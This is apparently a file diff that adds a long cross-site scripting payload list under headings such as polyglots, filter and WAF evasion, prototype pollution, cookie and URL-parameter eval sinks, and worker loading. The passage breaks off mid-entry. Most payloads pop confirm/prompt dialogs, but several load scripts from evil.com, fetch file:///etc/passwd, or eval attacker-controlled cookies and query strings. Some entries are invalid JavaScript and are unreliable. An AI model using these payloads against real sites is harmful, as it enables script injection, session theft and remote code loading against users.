+<math><mmultiscripts onsubscriptshift=prompt(9)></mmultiscripts></math>
+<math><mo onlspace=print()></mo></math>
+<math><mover onaccent=console.log(10)></mover></math>
+<math><mpadded onheight=confirm(11)></mpadded></math>
+<math><mphantom ondepth=prompt(12)></mphantom></math>
+
+========================
+OBJECT PROTOTYPE POLLUTION GADGETS
+========================
+
+<script>({}).__defineGetter__('x',()=>console.log('URDev_GETTER'));x</script><script>Object.prototype.__proto__.polluted=()=>confirm(2)</script><script>Array.prototype.__proto__.toString=()=>prompt(3)</script><script>Function.prototype.__proto__.call=()=>print()</script><script>String.prototype.__proto__.valueOf=()=>console.log(4)</script><script>Number.prototype.__proto__.toFixed=()=>confirm(5)</script><script>Boolean.prototype.__proto__.toString=()=>prompt(6)</script><script>Date.prototype.__proto__.getTime=()=>print()</script><script>RegExp.prototype.__proto__.exec=()=>console.log(7)</script><script>Error.prototype.__proto__.toString=()=>confirm(8)</script><script>Promise.prototype.__proto__.then=()=>prompt(9)</script><script>Map.prototype.__proto__.get=()=>print()</script><script>Set.prototype.__proto__.add=()=>console.log(10)</script>
+========================
+ERROR HANDLING & EXCEPTION GADGETS
+========================
+<img src=x onerror=throw 'URDev'>
+
+<script>onerror=()=>console.log('URDev_ERROR');throw 1</script><script>try{throw new Error()}catch(e){confirm(2)}</script><script>Promise.reject().catch(()=>prompt(3))</script><script>addEventListener('error',()=>print())</script><script>setTimeout(()=>{throw new Error(console.log(4))})</script><script>new Promise((_,r)=>r(confirm(5)))</script><script>async function x(){throw prompt(6)};x()</script><script>fetch('x').catch(()=>print())</script><script>import('x').catch(()=>console.log(7))</script><script>new Worker('x').onerror=()=>confirm(8)</script><script>window.onunhandledrejection=e=>eval(e.reason)</script>
+========================
+COMMENT & CONDITIONAL PARSING BYPASS
+========================
+
+<!--[if gte IE 4]><script>console.log('URDev_IE')</script><![endif]--><!--<svg onload=confirm('URDev_COMMENT')>--><!-->'><img src=x onerror=prompt(3)>--><!----><script>print()</script><!--[if IE]><script>console.log(4)</script><![endif]--><!--[if !IE]><!--><script>confirm(5)</script><!--<![endif]--><!--[if lt IE 9]><script>prompt(6)</script><![endif]--><!--[if vml]><script>print()</script><![endif]--><!--[if true]><script>console.log(7)</script><![endif]--><!--<%console.log(8)%>--><!--${console.log(9)}--><!--{{console.log(10)}}--><!--@console.log(11)--><!--#console.log(12)-->
+========================
+BROKEN TAG RECOVERY & PARSER ABUSE
+========================
+<svg><script>console.log('URDev_BROKEN')</svg>
+<img src=x onerror=confirm('URDev_BROKEN2')//>
+
+<script>console.log(3)</style>
+<svg><script>prompt(4)<
+<img src=x onerror=print(5)//
+
+<SCRIPT>console.log(6)</SCRIPT><ScRiPt>confirm(7)</ScRiPt>
+<svg><script>prompt(8</script></svg>
+<img src=x onerror=console.log(9)>
+<svg/onload=confirm(10)>
+<iframe/src=javascript:prompt(11)>
+<img/src=x onerror=print(12)>
+
+========================
+UNICODE & RTL DIRECTIONAL TRICKS
+========================
+
+<script>console.log('\u202eURDev_RTL')</script>
+<img src=x onerror=confirm('\u2066test\u2069')>
+
+<script>prompt('\u202bxss\u202c')</script><div dir=rtl><script>print()</script></div> <img src=x onerror=console.log('\u200E\u200F')> <script>eval('\u0063\u006F\u006E\u0073\u006F\u006C\u0065\u002E\u006C\u006F\u0067\u0028\u0031\u0029')</script> <svg onload=confirm('\u202a\u202b\u202c')> <script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0078\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0063\u006F\u006E\u0066\u0069\u0072\u006D\u0028\u0031\u0029\u003E')</script> <img src=x onerror=prompt('\uFEFF')> <script>print('\u2028\u2029')</script>
+========================
+CASE MANIPULATION & ODD SYNTAX
+========================
+<ImG sRc=x OnErRoR=console.log('URDev_MIXED')>
+<SVg OnLoAd=confirm('URDev_SVG_MIXED')>
+
+<ScRiPt>prompt(3)</ScRiPt><IfRaMe SrCdOc="<script>print()</script>"></IfRaMe> <ObJeCt DaTa=javascript:console.log(4)></ObJeCt> <EmBeD sRc=javascript:confirm(5)> <ApPlEt CoDe=x oNeRrOr=prompt(6)></ApPlEt> <MaRqUeE oNsTaRt=print()></MaRqUeE> <ViDeO aUtOpLaY oNcAnPlAy=console.log(7)></ViDeO> <AuDiO sRc oNeRrOr=confirm(8)></AuDiO> <BoDy OnLoAd=prompt(9)></BoDy> <FrAmEsEt OnLoAd=print()></FrAmEsEt> <InPuT tYpE=iMaGe SrC=x OnErRoR=console.log(10)>
+========================
+ULTIMATE POLYGLOT PAYLOAD COLLECTION
+========================
+"></script></style></title></textarea></noscript><svg/onload=console.log('URDev_POLY1')><!-- '></iframe></object></embed><img src=x onerror=confirm('URDev_POLY2')> javascript:"/*'/*`/*--></styles></script><svg onload=prompt(3)>-->
+"><base href=javascript:console.log(4)//><a href=x>click</a>
+'><form><button formaction=javascript:confirm(5)>x</button>
+"><meta http-equiv=refresh content='0;url=javascript:prompt(6)'>
+'><link rel=stylesheet href=javascript:print()>
+"><template shadowrootmode=open><svg onload=console.log(7)></svg>
+'><object><param name=movie value=javascript:confirm(8)></object>
+"><iframe srcdoc="<img src=x onerror=prompt(9)>"></iframe>
+'><audio src=x onerror=print()></audio>
+"><video poster=x onerror=console.log(10)></video>
+'><track src=x onerror=confirm(11)></track>
+"><source src=x onerror=prompt(12)></source>
+
+========================
+ACCESSIBILITY (ARIA) EVENT VECTORS
+========================
+
+<div role=button aria-pressed=false onclick=console.log('URDev_ARIA')>aria button</div> <input aria-label=x onfocus=confirm('URDev_ARIA2') autofocus> <div role=checkbox aria-checked=false onchange=prompt(3)></div> <div role=link aria-label=x onclick=print()></div> <div role=menuitem onfocus=console.log(4) tabindex=0></div> <div role=option aria-selected=false onselect=confirm(5)></div> <div role=radio aria-checked=false onchange=prompt(6)></div> <div role=slider aria-valuenow=50 oninput=print()></div> <div role=tab aria-selected=false onfocus=console.log(7)></div> <div role=tabpanel aria-hidden=false onshow=confirm(8)></div> <div role=tooltip onshow=prompt(9)></div> <div role=treeitem aria-expanded=false ontoggle=print()></div> <div role=alert onshow=console.log(10)></div> <div role=progressbar aria-valuenow=0 onchange=confirm(11)></div>
+========================
+CONTENTEDITABLE EXECUTION CONTEXTS
+========================
+
+<div contenteditable oninput=console.log('URDev_EDIT')>edit me</div> <span contenteditable onblur=confirm('URDev_EDIT2')>x</span> <div contenteditable onfocus=prompt(3) tabindex=0>focus</div> <div contenteditable onpaste=print()>paste here</div> <div contenteditable oncut=console.log(4)>cut from</div> <div contenteditable oncopy=confirm(5)>copy this</div> <div contenteditable onkeydown=prompt(6)>type</div> <div contenteditable onkeyup=print()>type up</div> <div contenteditable onkeypress=console.log(7)>press</div> <div contenteditable onmouseenter=confirm(8)>hover</div> <div contenteditable onmouseleave=prompt(9)>leave</div> <div contenteditable oncontextmenu=print()>right click</div> <div contenteditable onscroll=console.log(10)>scroll</div> <div contenteditable onselect=confirm(11)>select</div>
+========================
+EXECUTABLE ATTRIBUTES (NON-STANDARD)
+========================
+<img src=x onerror=console.log.call(window,'URDev_CALL')>
+<svg onload=Function('confirm("URDev_FUNCTION")')()>
+<img src=x onerror=eval.call(window,'prompt(3)')>
+<svg onload=window['eval'].bind(window)('print()')>
+<img src=x onerror=setTimeout.call(window,'console.log(4)',0)>
+<svg onload=setInterval.apply(window,['confirm(5)',100])>
+<img src=x onerror=requestAnimationFrame.bind(window)(()=>prompt(6))>
+<svg onload=queueMicrotask(()=>print())>
+<img src=x onerror=new Function('console.log(7)')()>
+<svg onload=Reflect.apply(console.log,console,['URDev']>
+<img src=x onerror=Proxy.apply({},{apply:()=>confirm(9)})>
+<svg onload=Object.defineProperty(window,'x',{get(){prompt(10)}});x>
+
+========================
+FUNCTION CONSTRUCTOR CHAINING
+========================
+
+<script>[]["filter"]["constructor"]("console.log('URDev_FILTER')")()</script><script>this.constructor.constructor("confirm('URDev_CONSTRUCTOR')")()</script><script>Function.constructor("prompt(3)")()</script><script>window.constructor.constructor("print()")()</script><script>document.constructor.constructor("console.log(4)")()</script><script>navigator.constructor.constructor("confirm(5)")()</script><script>location.constructor.constructor("prompt(6)")()</script><script>history.constructor.constructor("print()")()</script><script>screen.constructor.constructor("console.log(7)")()</script><script>frames.constructor.constructor("confirm(8)")()</script><script>parent.constructor.constructor("prompt(9)")()</script><script>top.constructor.constructor("print()")()</script><script>self.constructor.constructor("console.log(10)")()</script>
+========================
+SETTER & GETTER SIDE EFFECTS
+========================
+
+<script>Object.defineProperty(window,'x',{get(){console.log('URDev_GETTER')}});x</script><script>Object.defineProperty(document,'x',{set(v){confirm(v)}});document.x=2</script><script>Object.defineProperty(navigator,'x',{get(){prompt(3)}});navigator.x</script><script>Object.defineProperty(location,'x',{set(v){print()}});location.x=4</script><script>Object.defineProperty(history,'x',{get(){console.log(5)}});history.x</script><script>Object.defineProperty(screen,'x',{set(v){confirm(6)}});screen.x=7</script><script>Object.defineProperty(frames,'x',{get(){prompt(8)}});frames.x</script><script>Object.defineProperty(parent,'x',{set(v){print()}});parent.x=9</script><script>Object.defineProperty(top,'x',{get(){console.log(10)}});top.x</script><script>Object.defineProperty(self,'x',{set(v){confirm(11)}});self.x=12</script><script>Object.defineProperty(document.body,'x',{get(){prompt(13)}});document.body.x</script><script>Object.defineProperty(document.head,'x',{set(v){print()}});document.head.x=14</script>
+========================
+PROTOTYPE POLLUTION SINKS
+========================
+
+<script>__proto__.toString=()=>{confirm('URDev_PROTO')}</script><script>__proto__.valueOf=()=>{prompt(2)}</script><script>__proto__.toJSON=()=>{print()}</script><script>__proto__.toSource=()=>{console.log(3)}</script><script>__proto__.constructor=()=>{confirm(4)}</script><script>__proto__.call=()=>{prompt(5)}</script><script>__proto__.apply=()=>{print()}</script><script>__proto__.bind=()=>{console.log(6)}</script><script>__proto__.then=()=>{confirm(7)}</script><script>__proto__.catch=()=>{prompt(8)}</script><script>__proto__.finally=()=>{print()}</script><script>__proto__.next=()=>{console.log(9)}</script><script>__proto__.return=()=>{confirm(10)}</script>
+========================
+TIMER-BASED DELAYED EXECUTION
+========================
+
+<script>setInterval("console.log('URDev_INTERVAL')",1000)</script><script>requestAnimationFrame(()=>confirm('URDev_ANIMATION'))</script><script>setTimeout("prompt(3)",500)</script><script>requestIdleCallback(()=>print())</script><script>setImmediate?setImmediate(()=>console.log(4)):setTimeout(()=>console.log(4),0)</script><script>queueMicrotask(()=>confirm(5))</script><script>Promise.resolve().then(()=>prompt(6))</script><script>new Promise(r=>r()).then(()=>print())</script><script>async function x(){await 1;console.log(7)};x()</script><script>setTimeout(()=>confirm(8),100)</script><script>setInterval(()=>prompt(9),200)</script><script>requestAnimationFrame(()=>print())</script><script>requestIdleCallback(()=>console.log(10))</script>
+========================
+DYNAMIC SCRIPT CREATION METHODS
+========================
+
+<script> s=document.createElement('script'); s.text='console.log("URDev_DYNAMIC")'; document.body.appendChild(s) </script><script> s=document.createElement('script'); s.src='javascript:confirm(2)'; document.body.appendChild(s) </script><script> s=document.createElement('script'); s.innerHTML='prompt(3)'; document.head.appendChild(s) </script><script> document.write('<script>print()</script>')</script> <script> document.writeln('<script>console.log(4)</script>') </script> <script> document.body.insertAdjacentHTML('beforeend','<script>confirm(5)</script>') </script> <script> document.head.insertAdjacentHTML('beforeend','<script>prompt(6)</script>') </script> <script> document.documentElement.appendChild(document.createElement('script')).text='print()' </script> <script> with(document)body.appendChild(createElement('script')).text='console.log(7)' </script> <script> eval('document.body.innerHTML+="<script>confirm(8)</script>"') </script>
+========================
+MODULE & IMPORT LOADING VECTORS
+========================
+
+<script type=module>import('data:text/javascript,console.log("URDev_MODULE")')</script><script type=module>import('javascript:confirm(2)')</script><script type=module>import('blob:https://example.com/uuid')</script><script type=module>new Function('import("data:text/javascript,prompt(3)")')()</script><script type=module>eval('import("data:text/javascript,print()")')</script><script type=module>window.import('data:text/javascript,console.log(4)')</script><script type=module>globalThis.import('data:text/javascript,confirm(5)')</script><script type=module>self.import('data:text/javascript,prompt(6)')</script><script type=module>top.import('data:text/javascript,print()')</script><script type=module>parent.import('data:text/javascript,console.log(7)')</script><script type=module>frames[0].import('data:text/javascript,confirm(8)')</script><script type=module>opener.import('data:text/javascript,prompt(9)')</script>
+========================
+WORKER & SHAREDWORKER EXPLOITS
+========================
+
+<script>new Worker('data:text/javascript,confirm("URDev_WORKER")')</script><script>new SharedWorker('data:text/javascript,prompt(2)')</script><script>new Worker('blob:https://example.com/uuid')</script><script>new Worker('javascript:print()')</script><script>Worker=SharedWorker;new Worker('data:text/javascript,console.log(3)')</script><script>new Worker(URL.createObjectURL(new Blob(['confirm(4)'])))</script><script>new SharedWorker(URL.createObjectURL(new Blob(['prompt(5)'])))</script><script>new Worker('//evil.com/worker.js')</script><script>new SharedWorker('//evil.com/shared.js')</script><script>new Worker('about:blank')</script><script>new SharedWorker('about:blank')</script>
+========================
+BLOB URL EXECUTION VECTORS
+========================
+
+<script> b=new Blob(['console.log("URDev_BLOB")'],{type:'text/javascript'}); u=URL.createObjectURL(b);import(u) </script><script> b=new Blob(['confirm(2)'],{type:'text/javascript'}); u=URL.createObjectURL(b);new Worker(u) </script><script> b=new Blob(['prompt(3)'],{type:'text/javascript'}); u=URL.createObjectURL(b);eval(await fetch(u).then(r=>r.text())) </script><script> b=new Blob(['print()'],{type:'text/javascript'}); u=URL.createObjectURL(b);document.write('<script src='+u+'></script>')</script> <script> b=new Blob(['console.log(4)'],{type:'text/javascript'}); u=URL.createObjectURL(b);document.body.innerHTML='<iframe src='+u+'></iframe>' </script> <script> b=new Blob(['confirm(5)'],{type:'application/javascript'}); u=URL.createObjectURL(b);location=u </script> <script> b=new Blob(['prompt(6)'],{type:'text/x-javascript'}); u=URL.createObjectURL(b);open(u) </script>
+========================
+OFFSCREEN & VISIBILITY EVENTS
+========================
+
+<div onvisibilitychange=console.log('URDev_VISIBILITY')></div> <div onwebkitvisibilitychange=confirm(2)></div> <div onmozvisibilitychange=prompt(3)></div> <div onmsvisibilitychange=print()></div> <iframe onvisibilitychange=console.log(4)></iframe> <object onvisibilitychange=confirm(5)></object> <embed onvisibilitychange=prompt(6)></embed> <applet onvisibilitychange=print()></applet> <video onwebkitbeginfullscreen=console.log(7)></video> <audio onwebkitbeginfullscreen=confirm(8)></audio> <iframe onwebkitbeginfullscreen=prompt(9)></iframe> <object onwebkitbeginfullscreen=print()></object>
+========================
+PRINT & BEFOREPRINT EVENTS
+========================
+
+<body onbeforeprint=confirm('URDev_PRINT')></body> <body onafterprint=prompt(2)></body> <body onwebkitbeforeprint=print()></body> <body onwebkitafterprint=console.log(3)></body> <body onmsbeforeprint=confirm(4)></body> <body onmsafterprint=prompt(5)></body> <iframe onbeforeprint=print()></iframe> <object onbeforeprint=console.log(6)></object> <embed onbeforeprint=confirm(7)></embed> <applet onbeforeprint=prompt(8)></applet> <video onbeforeprint=print()></video> <audio onbeforeprint=console.log(9)></audio>
+========================
+SCROLL-BASED EVENT TRIGGERS
+========================
+
+<div style=height:2000px onscroll=console.log('URDev_SCROLL')></div> <div style=height:2000px onwheel=confirm(2)></div> <div style=height:2000px onmousewheel=prompt(3)></div> <div style=height:2000px onDOMMouseScroll=print()></div> <div style=height:2000px onMozMousePixelScroll=console.log(4)></div> <iframe style=height:2000px onscroll=confirm(5)></iframe> <object style=height:2000px onscroll=prompt(6)></object> <embed style=height:2000px onscroll=print()></embed> <applet style=height:2000px onscroll=console.log(7)></applet> <video style=height:2000px onscroll=confirm(8)></video> <audio style=height:2000px onscroll=prompt(9)></audio>
+========================
+MEDIA QUERY & MATCHMEDIA CALLBACKS
+========================
+
+<script>matchMedia('(max-width:9999px)').addListener(()=>console.log('URDEV_MEDIA'))</script><script>matchMedia('(min-width:0px)').addListener(()=>confirm(2))</script><script>matchMedia('(orientation:landscape)').addListener(()=>prompt(3))</script><script>matchMedia('(prefers-color-scheme:dark)').addListener(()=>print())</script><script>matchMedia('(hover:hover)').addListener(()=>console.log(4))</script><script>matchMedia('(any-pointer:fine)').addListener(()=>confirm(5))</script><script>matchMedia('(resolution:72dpi)').addListener(()=>prompt(6))</script><script>matchMedia('(scan:interlace)').addListener(()=>print())</script><script>matchMedia('(grid:0)').addListener(()=>console.log(7))</script><script>matchMedia('(update:slow)').addListener(()=>confirm(8))</script><script>matchMedia('(overflow-block:scroll)').addListener(()=>prompt(9))</script><script>matchMedia('(overflow-inline:scroll)').addListener(()=>print())</script>
+========================
+NETWORK ERROR & FETCH CALLBACKS
+========================
+
+<script> fetch('x').catch(()=>confirm('URDEV_FETCH')) </script><script> fetch('javascript:console.log(2)') </script><script> new Request('javascript:prompt(3)') </script><script> new Response('<script>print()</script>')</script> <script> fetch('data:text/html,<script>console.log(4)</script>') </script> <script> fetch('blob:https://example.com/uuid') </script> <script> fetch('about:blank') </script> <script> fetch('//evil.com/x') </script> <script> fetch('file:///etc/passwd') </script> <script> fetch('\\evil.com\share') </script>
+========================
+PROMISE REJECTION HANDLERS
+========================
+
+<script>onunhandledrejection=e=>console.log('URDev_REJECTION');Promise.reject()</script><script>onrejectionhandled=e=>confirm(2);Promise.reject().catch(()=>{})</script><script>addEventListener('unhandledrejection',e=>prompt(3));Promise.reject()</script><script>addEventListener('rejectionhandled',e=>print());Promise.reject().catch(()=>{})</script><script>window.onunhandledrejection=e=>eval(e.reason);Promise.reject('console.log(4)')</script><script>window.onrejectionhandled=e=>eval(e.reason);Promise.reject('confirm(5)').catch(()=>{})</script><script>self.onunhandledrejection=e=>eval(e.reason);Promise.reject('prompt(6)')</script><script>self.onrejectionhandled=e=>eval(e.reason);Promise.reject('print()').catch(()=>{})</script><script>top.onunhandledrejection=e=>eval(e.reason);Promise.reject('console.log(7)')</script><script>top.onrejectionhandled=e=>eval(e.reason);Promise.reject('confirm(8)').catch(()=>{})</script>
+========================
+NAVIGATOR FEATURE EXPLOITS
+========================
+
+<script>navigator.sendBeacon('x',console.log('URDev_BEACON'))</script><script>navigator.share({title:'URDev'}).then(()=>confirm(2))</script><script>navigator.mediaDevices.getUserMedia({video:true}).then(()=>prompt(3))</script><script>navigator.geolocation.getCurrentPosition(()=>print())</script><script>navigator.getBattery().then(()=>console.log(4))</script><script>navigator.getGamepads().then(()=>confirm(5))</script><script>navigator.getVRDisplays().then(()=>prompt(6))</script><script>navigator.getUserMedia({audio:true},()=>print(),()=>console.log(7))</script><script>navigator.webkitGetUserMedia({video:true},()=>confirm(8),()=>prompt(9))</script><script>navigator.mozGetUserMedia({audio:true},()=>print(),()=>console.log(10))</script><script>navigator.msGetUserMedia({video:true},()=>confirm(11),()=>prompt(12))</script>
+========================
+DOM PARSER & DOCUMENT CREATION
+========================
+
+<script> p=new DOMParser().parseFromString('<svg onload=confirm("URDev_DOMPARSER")>','text/html') document.body.append(p.body) </script><script> p=new DOMParser().parseFromString('<script>prompt(2)','text/html') document.head.append(p.head) </script><script> p=new DOMParser().parseFromString('<img src=x onerror=print()>','text/html') document.body.append(p.body) </script><script> p=new DOMParser().parseFromString('<iframe srcdoc="<script>console.log(3)">','text/html') document.body.append(p.body) </script><script> p=new DOMParser().parseFromString('<object data=javascript:confirm(4)>','text/html') document.body.append(p.body) </script><script> p=new DOMParser().parseFromString('<embed src=javascript:prompt(5)>','text/html') document.body.append(p.body) </script><script> p=new DOMParser().parseFromString('<applet code=x onerror=print()>','text/html') document.body.append(p.body) </script>
+========================
+RANGE & SELECTION API EXPLOITS
+========================
+
+<script> r=document.createRange(); r.createContextualFragment('<img src=x onerror=console.log("URDev_RANGE")>') </script><script> r=document.createRange(); r.selectNode(document.body); r.deleteContents(); r.insertNode(document.createRange().createContextualFragment('<svg onload=confirm(2)>')) </script><script> s=window.getSelection(); r=document.createRange(); r.selectNode(document.body); s.addRange(r); document.execCommand('insertHTML',false,'<img src=x onerror=prompt(3)>') </script><script> r=document.createRange(); r.setStart(document.body,0); r.setEnd(document.body,0); r.insertNode(document.createTextNode('<script>print()</script>'))</script> <script> r=document.createRange(); r.selectNodeContents(document.body); r.deleteContents(); r.insertNode(document.createTextNode('<iframe srcdoc="<script>console.log(4)"></iframe>')) </script> <script> r=document.createRange(); r.setStart(document.body,0); r.setEnd(document.body,0); r.insertNode(document.createComment('<img src=x onerror=confirm(5)>')) </script>
+========================
+LOCATION OBJECT MANIPULATION
+========================
+
+<script>location='javascript:confirm("URDev_LOCATION")'</script><script>location.href='javascript:prompt(2)'</script><script>location.assign('javascript:print()')</script><script>location.replace('javascript:console.log(3)')</script><script>location.pathname='javascript:confirm(4)'</script><script>location.search='?javascript:prompt(5)'</script><script>location.hash='#javascript:print()'</script><script>location.protocol='javascript:'</script><script>location.hostname='javascript:console.log(6)'</script><script>location.port='javascript:confirm(7)'</script><script>location.origin='javascript:prompt(8)'</script><script>location.username='javascript:print()'</script><script>location.password='javascript:console.log(9)'</script>
+========================
+ANCHOR HASH CHANGE EVENTS
+========================
+
+<body onhashchange=console.log('URDev_HASH')></body> <body onwebkithashchange=confirm(2)></body> <body onmozhashchange=prompt(3)></body> <body onmshashchange=print()></body> <iframe onhashchange=console.log(4)></iframe> <object onhashchange=confirm(5)></object> <embed onhashchange=prompt(6)></embed> <applet onhashchange=print()></applet> <video onhashchange=console.log(7)></video> <audio onhashchange=confirm(8)></audio> <frameset onhashchange=prompt(9)></frameset>
+========================
+DOCUMENT COMMAND EXECUTION
+========================
+
+<script>document.execCommand('insertHTML',0,'<img src=x onerror=confirm("URDev_COMMAND")>')</script><script>document.execCommand('insertText',0,'<script>prompt(2)</script>')</script><script>document.execCommand('formatBlock',0,'<script>print()</script>')</script><script>document.execCommand('createLink',0,'javascript:console.log(3)')</script><script>document.execCommand('insertImage',0,'javascript:confirm(4)')</script><script>document.execCommand('insertHorizontalRule',0,'<img src=x onerror=prompt(5)>')</script><script>document.execCommand('insertOrderedList',0,'<script>print()</script>')</script><script>document.execCommand('insertUnorderedList',0,'<iframe srcdoc="<script>console.log(6)"></iframe>')</script><script>document.execCommand('insertParagraph',0,'<object data=javascript:confirm(7)></object>')</script><script>document.execCommand('insertLineBreak',0,'<embed src=javascript:prompt(8)></embed>')</script>
+========================
+LEGACY FILTER & WAF EVASION
+========================
+
+<script><!--console.log('URDev_FILTER')//--></script><script>/*<!--*/confirm(2)//--></script><script>/**/prompt(3)/**/</script><script>//<!-- print()//--></script>
+<img src=x onerror=console.log(4)//<!-- <svg onload=confirm(5)//-->
+
+<iframe srcdoc="<script>prompt(6)</script>"><!-- <object data=javascript:print()><!----> <embed src=javascript:console.log(7)><!--[if IE]> <applet code=x onerror=confirm(8)><!--<![endif]--> <marquee onstart=prompt(9)><!--[if !IE]><!--> <video autoplay oncanplay=print()><!--<![endif]-->
+========================
+FRAME & IFRAME NAME INJECTION
+========================
+
+<iframe name="<svg onload=confirm('URDEV_FRAMENAME')>"></iframe> <frame name="<img src=x onerror=prompt(2)>"></frame> <object name="<script>print()</script>"></object> <embed name="<marquee onstart=console.log(3)>"></embed> <applet name="<video ontimeupdate=confirm(4)>"></applet> <form name="<audio onended=prompt(5)>"></form> <input name="<track oncuechange=print()>"> <button name="<source onerror=console.log(6)>"></button> <select name="<picture onload=confirm(7)>"></select> <textarea name="<iframe srcdoc='<script>prompt(8)'>"></textarea> <label name="<object data=javascript:print()>"></label> <fieldset name="<embed src=javascript:console.log(9)>"></fieldset> <legend name="<applet code=x onerror=confirm(10)>"></legend>
+========================
+DATASET & DATA ATTRIBUTE REFLECTION
+========================
+
+<div data-x="<img src=x onerror=console.log('URDEV_DATA')>"></div> <div data-urdev="<svg onload=confirm(2)>"></div> <div data-payload="<iframe srcdoc='<script>prompt(3)'>"></div> <div data-inject="<object data=javascript:print()>"></div> <div data-malicious="<embed src=javascript:console.log(4)>"></div> <div data-exploit="<applet code=x onerror=confirm(5)>"></div> <div data-xss="<marquee onstart=prompt(6)>"></div> <div data-test="<video ontimeupdate=print()>"></div> <div data-check="<audio onended=console.log(7)>"></div> <div data-value="<track oncuechange=confirm(8)>"></div> <div data-content="<source onerror=prompt(9)>"></div> <div data-html="<picture onload=print()>"></div> <div data-script="<script>console.log(10)</script>"></div>
+========================
+CUSTOM PROTOCOL HANDLER REGISTRATION
+========================
+
+<script>navigator.registerProtocolHandler('web+x','javascript:confirm("URDEV_PROTOCOL")','x')</script><script>navigator.registerProtocolHandler('mailto','javascript:prompt(2)','x')</script><script>navigator.registerProtocolHandler('irc','javascript:print()','x')</script><script>navigator.registerProtocolHandler('magnet','javascript:console.log(3)','x')</script><script>navigator.registerProtocolHandler('bitcoin','javascript:confirm(4)','x')</script><script>navigator.registerProtocolHandler('sms','javascript:prompt(5)','x')</script><script>navigator.registerProtocolHandler('tel','javascript:print()','x')</script><script>navigator.registerProtocolHandler('geo','javascript:console.log(6)','x')</script><script>navigator.registerProtocolHandler('market','javascript:confirm(7)','x')</script><script>navigator.registerProtocolHandler('itms','javascript:prompt(8)','x')</script><script>navigator.registerProtocolHandler('itms-apps','javascript:print()','x')</script><script>navigator.registerProtocolHandler('skype','javascript:console.log(9)','x')</script>
+========================
+FINAL MEGA POLYGLOT ULTIMATE
+========================
+"></dialog></portal></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><svg/onload=console.log('URDEV_MEGA1')><!-- '><!--</title></textarea></noscript></noframes></noembed></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><img src=x onerror=confirm('URDEV_MEGA2')> javascript:"/*'/*`/*--></styles></script></title></textarea></noscript></noframes></noembed></template></slot></summary></details></datalist></option></picture></video></audio></iframe></object></embed></style></script><svg onload=prompt('URDEV_MEGA3')>-->
+"></base></bgsound></body></caption></col></colgroup></frame></frameset></head></html></iframe></layer></legend></link></meta></noembed></noframes></noscript></object></option></param></plaintext></script></style></tbody></td></textarea></tfoot></th></thead></title></tr></xmp><svg/onload=print()><!--
+
+========================
+HTTP HEADER INJECTION CONTEXTS
+========================
+
+<script>document.write(decodeURIComponent(location.search.slice(1)))</script><img src=x onerror=console.log(document.referrer)> <script>new URL(location).searchParams.forEach(v=>eval(v))</script> <script>fetch(location.href).then(r=>r.text()).then(t=>document.write(t))</script> <script>document.write(document.location.origin)</script> <script>document.write(window.name)</script> <script>document.write(top.document.domain)</script> <script>document.write(parent.frames[0].name)</script> <script>document.write(opener.document.title)</script> <script>document.write(self.origin)</script> <script>document.write(frames[0].location.href)</script> <script>document.write(history.state)</script> <script>document.write(navigator.userAgent)</script>
+========================
+REFLECTED PARAMETER SINKS
+========================
+
+<script>new URLSearchParams(location.search).forEach(v=>eval(v))</script><script>Object.fromEntries(new URLSearchParams(location.search)).x&&eval(Object.fromEntries(new URLSearchParams(location.search)).x)</script><script>eval(new URL(location).searchParams.get('x'))</script><script>document.write(new URL(location).searchParams.get('x'))</script><script>document.body.innerHTML=new URL(location).searchParams.get('x')</script><script>document.head.innerHTML=new URL(location).searchParams.get('x')</script><script>document.title=new URL(location).searchParams.get('x')</script><script>document.cookie=new URL(location).searchParams.get('x')</script><script>localStorage.x=new URL(location).searchParams.get('x')</script><script>sessionStorage.x=new URL(location).searchParams.get('x')</script><script>history.replaceState(null,null,new URL(location).searchParams.get('x'))</script><script>location.href=new URL(location).searchParams.get('x')</script>
+========================
+COOKIE-BASED EXECUTION FLOWS
+========================
+
+<script>document.write(document.cookie)</script><script>eval(document.cookie.split('=')[1])</script><script>document.body.innerHTML=document.cookie</script><script>document.head.innerHTML=document.cookie</script><script>document.title=document.cookie</script><script>location.href=document.cookie</script><script>history.replaceState(null,null,document.cookie)</script><script>localStorage.x=document.cookie</script><script>sessionStorage.x=document.cookie</script><script>window.name=document.cookie</script><script>top.name=document.cookie</script><script>parent.name=document.cookie</script><script>opener.name=document.cookie</script>
+========================
+DOM CLONING & NODE MANIPULATION
+========================
+
+<script> n=document.createElement('div'); n.innerHTML='<img src=x onerror=console.log("URDEV_CLONE")>'; document.body.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('div'); n.innerHTML='<svg onload=confirm(2)>'; document.head.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('script'); n.text='prompt(3)'; document.body.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('iframe'); n.srcdoc='<script>print()'; document.body.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('object'); n.data='javascript:console.log(4)'; document.body.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('embed'); n.src='javascript:confirm(5)'; document.body.appendChild(n.cloneNode(true)) </script><script> n=document.createElement('applet'); n.code='x'; n.onerror=()=>prompt(6); document.body.appendChild(n.cloneNode(true)) </script>
+========================
+NODE ITERATOR & TREE WALKER INTERACTION
+========================
+
+<script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_ELEMENT); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_COMMENT); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_CDATA_SECTION); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_ENTITY_REFERENCE); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_ENTITY); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_PROCESSING_INSTRUCTION); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_DOCUMENT); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_DOCUMENT_TYPE); while(w.nextNode()){} </script><script> w=document.createTreeWalker(document.body,NodeFilter.SHOW_DOCUMENT_FRAGMENT); 